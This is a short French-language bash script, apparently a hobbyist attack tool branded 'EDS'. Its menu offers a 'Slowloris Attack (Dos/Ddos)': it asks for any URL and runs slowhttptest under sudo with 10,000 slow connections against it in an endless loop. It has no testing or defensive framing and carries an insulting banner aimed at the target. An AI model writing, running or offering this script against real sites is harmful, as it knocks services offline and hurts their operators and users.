#!/bin/bash

# Color panel

Noir0='\e[0;30m'
Rouge0='\e[0;31m'
Vert0='\e[0;32m'
Jaune0='\e[0;33m'
Bleu0='\e[0;34m'
Magenta0='\e[0;35m'
Cyan0='\e[0;36m'
Blanc0='\e[0;37m'

# Color panel highlight

Noir='\e[0;40m'
Rouge='\e[0;41m'
Vert='\e[0;42m'
Jaune='\e[0;43m'
Bleu='\e[0;44m'
Magenta='\e[0;45m'
Cyan='\e[0;46m'
Blanc='\e[0;47m'

Reset='\e[0m'

# Panel indication
context_menu=" $Rouge0[ EDS ] » $Reset"
indic_question=" $Bleu0 [$Blanc0 ? $Bleu0]$Reset"
indic_valid=" $Blanc0 [$Vert0 ✓ $Blanc0]$Reset"
indic_invalid=" $Rouge0 [ ✕ ] $Blanc0"
indic_sys="  [ - ] "

# Main

echo -e "
$Rouge0                                      ______    __    
$Rouge0                                     / ____/___/ /____
$Rouge0                                    / __/ / __  / ___/
$Rouge0                                   / /___/ /_/ (__  ) 
$Rouge0                                  /_____/\__,_/____/       
$Rouge0             ______________________________________________________|_._._._._._._._._._.
$Rouge0             \_____________________________________________________|_#_#_#_#_#_#_#_#_#_|  
                                                                   l       
                                                                                       
                            $Reset|$Rouge0 Attack $Reset L
                                            
                                $Rouge0[$Reset 1 $Rouge0] -$Reset Slowloris Attack (Dos/Ddos)

"
echo -n -e "$indic_question $context_menu Veuillez faire un choix : " ; read res1
sleep 1

# Choice 1

if [[ "$res1" == 1 ]]; then 
    sleep 1
    echo -e "
    $Rouge0                  _
    $Rouge0                 /\)
    $Rouge0                /\/
    $Rouge0               /\/
    $Rouge0             _/L/
    $Rouge0            (/\_)
    $Rouge0            /%/  
    $Rouge0           /%/  
    $Rouge0          /%/
    $Rouge0         /%/
    $Rouge0        /%/
    $Rouge0       /%/
    $Rouge0      /%/
    $Rouge0     /%/
    $Rouge0    /%/
    $Rouge0   /%/   $Reset Enjoy$Rouge0 Defeat$Reset Slut 
    $Rouge0  /%' 
    $Rouge0  \/
    "    

    echo -n -e "$context_menu $indic_question Veuillez entrer l'URL : " ; read url
    
    slowloris_attack() {
        sudo slowhttptest -c 10000 -i 100 -r 2000 -t GET -u "$url" "$@"
    }

    delay=1

    while true; do 
        slowloris_attack -x 20 -p 3
        echo -e "$Rouge Lancement de la prochaine attaque $Reset $delay"
    done 
fi
